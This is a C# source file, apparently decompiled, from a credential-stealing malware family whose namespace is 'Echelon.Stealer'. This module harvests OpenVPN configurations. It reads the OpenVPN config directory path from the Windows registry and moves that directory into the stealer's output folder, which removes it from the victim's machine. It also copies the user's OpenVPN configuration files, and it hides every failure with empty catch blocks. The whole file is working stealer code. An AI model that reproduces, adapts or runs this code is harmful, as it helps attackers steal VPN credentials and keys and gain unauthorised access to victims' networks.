using System;
using System.IO;
using Echelon.Global;
using Microsoft.Win32;

namespace Echelon.Stealer.VPN
{
	// Token: 0x02000017 RID: 23
	internal class OpenVPN
	{
		// Token: 0x06000060 RID: 96 RVA: 0x0001A25C File Offset: 0x0001845C
		public static void GetOpenVPN(string Echelon_Dir)
		{
			try
			{
				RegistryKey localMachine = Registry.LocalMachine;
				string[] subKeyNames = localMachine.OpenSubKey("SOFTWARE").GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					if (subKeyNames[i] == "OpenVPN")
					{
						Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
						try
						{
							new DirectoryInfo(localMachine.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString()).MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
							OpenVPN.count++;
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				string path = Help.UserProfile + "\\OpenVPN\\config\\conf\\";
				if (Directory.Exists(path))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
					{
						Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
						fileInfo.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + fileInfo.Name);
					}
					OpenVPN.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000051 RID: 81
		public static int count;
	}
}
